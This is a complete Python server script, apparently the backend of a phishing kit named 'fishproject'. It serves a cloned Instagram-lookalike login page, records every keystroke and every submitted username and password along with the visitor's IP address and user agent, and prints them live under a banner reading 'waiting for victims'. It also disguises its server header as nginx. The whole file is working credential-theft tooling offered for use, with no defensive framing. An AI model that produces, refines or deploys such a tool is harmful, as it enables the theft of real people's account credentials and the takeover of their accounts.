#!/usr/bin/env python3
"""
fishproject - Instagram-lookalike login page + live keystroke/credential listener.

Serves the cloned login page on a port you pick and logs every keystroke and every
submitted credential to logs/captures.log (JSONL) while streaming them to stdout.

Run:  python server.py            (default port 8080)
      python server.py 9090       (custom port)
      set PORT=9090 & python server.py
"""

import json
import os
import sys
import threading
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

ROOT = os.path.dirname(os.path.abspath(__file__))
PUBLIC = os.path.join(ROOT, "public")
LOG_DIR = os.path.join(ROOT, "logs")
LOG_FILE = os.path.join(LOG_DIR, "captures.log")

DEFAULT_PORT = 8080

# Terminal colors (Windows 10+ conhost supports ANSI once enabled).
ESC = "\x1b["
C_RESET = ESC + "0m"
C_DIM = ESC + "90m"
C_RED = ESC + "91m"
C_GREEN = ESC + "92m"
C_YELLOW = ESC + "93m"
C_BLUE = ESC + "94m"
C_CYAN = ESC + "96m"

_log_lock = threading.Lock()


def enable_ansi():
    if os.name == "nt":
        try:
            import ctypes

            k = ctypes.windll.kernel32
            k.SetConsoleMode(k.GetStdHandle(-11), 7)
        except Exception:
            pass


def now():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def write_log(record):
    """Append one JSON record to the log file (thread-safe)."""
    os.makedirs(LOG_DIR, exist_ok=True)
    line = json.dumps(record, ensure_ascii=False)
    with _log_lock:
        with open(LOG_FILE, "a", encoding="utf-8") as fh:
            fh.write(line + "\n")


def banner(port):
    print(C_CYAN + "=" * 62 + C_RESET)
    print(C_CYAN + "  fishproject  ::  listener online" + C_RESET)
    print(C_CYAN + "=" * 62 + C_RESET)
    print(f"  serving  : {C_BLUE}http://0.0.0.0:{port}/{C_RESET}")
    print(f"  public   : {PUBLIC}")
    print(f"  logfile  : {LOG_FILE}")
    print(f"  page     : http://<this-machine-ip>:{port}/")
    print(C_DIM + "  local ip :" + C_RESET, end=" ")
    try:
        import socket

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        print(C_GREEN + s.getsockname()[0] + C_RESET)
        s.close()
    except Exception:
        print(C_DIM + "(unknown)" + C_RESET)
    print(C_CYAN + "-" * 62 + C_RESET)
    print(C_DIM + "  waiting for victims..." + C_RESET)
    print(C_CYAN + "=" * 62 + C_RESET)


class Handler(BaseHTTPRequestHandler):
    server_version = "nginx"  # cosmetic - don't advertise python

    # --- helpers ---------------------------------------------------------
    def _send(self, code, body=b"", ctype="text/plain", extra=None):
        if isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        if extra:
            for k, v in extra.items():
                self.send_header(k, v)
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    def _client_ip(self):
        fwd = self.headers.get("X-Forwarded-For")
        if fwd:
            return fwd.split(",")[0].strip()
        return self.client_address[0]

    def log_message(self, fmt, *args):
        # Keep the console clean; we do our own logging.
        pass

    # --- routes ----------------------------------------------------------
    def do_GET(self):
        path = self.path.split("?", 1)[0]
        if path in ("/", ""):
            path = "/index.html"

        # Block traversal.
        rel = os.path.normpath(path).lstrip("/\\")
        if rel.startswith("..") or os.path.isabs(rel):
            self._send(403, "forbidden")
            return

        full = os.path.join(PUBLIC, rel)
        if not os.path.isfile(full):
            self._send(404, "not found")
            return

        ext = os.path.splitext(full)[1].lower()
        ctypes = {
            ".html": "text/html; charset=utf-8",
            ".css": "text/css; charset=utf-8",
            ".js": "application/javascript; charset=utf-8",
            ".json": "application/json",
            ".png": "image/png",
            ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg",
            ".gif": "image/gif",
            ".svg": "image/svg+xml",
            ".ico": "image/x-icon",
            ".woff2": "font/woff2",
            ".woff": "font/woff",
            ".ttf": "font/ttf",
        }
        ctype = ctypes.get(ext, "application/octet-stream")
        with open(full, "rb") as fh:
            data = fh.read()

        ip = self._client_ip()
        ua = self.headers.get("User-Agent", "-")
        if path == "/index.html":
            print(f"{C_DIM}[{now()}]{C_RESET} {C_GREEN}VISIT{C_RESET}   {ip}  {C_DIM}{ua[:60]}{C_RESET}")
            write_log({"ts": datetime.now().isoformat(), "event": "visit", "ip": ip, "ua": ua, "path": path})

        self._send(200, data, ctype)

    def do_HEAD(self):
        self.do_GET()

    def do_POST(self):
        path = self.path.split("?", 1)[0]
        if path not in ("/api/capture", "/collect", "/login"):
            self._send(404, "not found")
            return

        length = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(length) if length else b""

        try:
            data = json.loads(raw.decode("utf-8") or "{}")
        except Exception:
            data = {"_raw": raw.decode("utf-8", "replace")}

        ip = self._client_ip()
        ua = self.headers.get("User-Agent", "-")
        event = data.get("type", "unknown")

        record = {
            "ts": datetime.now().isoformat(),
            "event": event,
            "ip": ip,
            "ua": ua,
            "data": data,
        }
        write_log(record)

        self._print_event(event, data, ip)

        # 1x1 gif-ish ack; the page doesn't care about the body.
        self._send(200, b"{\"ok\":true}", "application/json")

    # --- live console rendering -----------------------------------------
    def _print_event(self, event, data, ip):
        ts = f"{C_DIM}[{now()}]{C_RESET}"
        if event == "credentials":
            user = data.get("username", "") or data.get("user", "")
            pw = data.get("password", "") or data.get("pass", "")
            print()
            print(f"{ts} {C_RED}\u2716 CREDENTIALS SUBMITTED{C_RESET}  {C_DIM}{ip}{C_RESET}")
            print(f"        {C_CYAN}user{C_RESET} : {C_YELLOW}{user}{C_RESET}")
            print(f"        {C_CYAN}pass{C_RESET} : {C_YELLOW}{pw}{C_RESET}")
            print()
        elif event == "keystroke":
            field = data.get("field", "?")
            key = data.get("key", "")
            value = data.get("value", "")
            if len(str(key)) > 1:
                key = f"<{key}>"
            print(f"{ts} {C_BLUE}key{C_RESET}  [{field}] {C_DIM}{key}{C_RESET}  -> {C_GREEN}{value}{C_RESET}")
        else:
            print(f"{ts} {C_DIM}{event}: {json.dumps(data, ensure_ascii=False)}{C_RESET}")


def main():
    enable_ansi()
    port = DEFAULT_PORT
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except ValueError:
            pass
    elif os.environ.get("PORT"):
        try:
            port = int(os.environ["PORT"])
        except ValueError:
            pass

    os.makedirs(LOG_DIR, exist_ok=True)
    os.makedirs(PUBLIC, exist_ok=True)

    httpd = ThreadingHTTPServer(("0.0.0.0", port), Handler)
    banner(port)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{C_DIM}shutting down; log kept at {LOG_FILE}{C_RESET}")


if __name__ == "__main__":
    main()
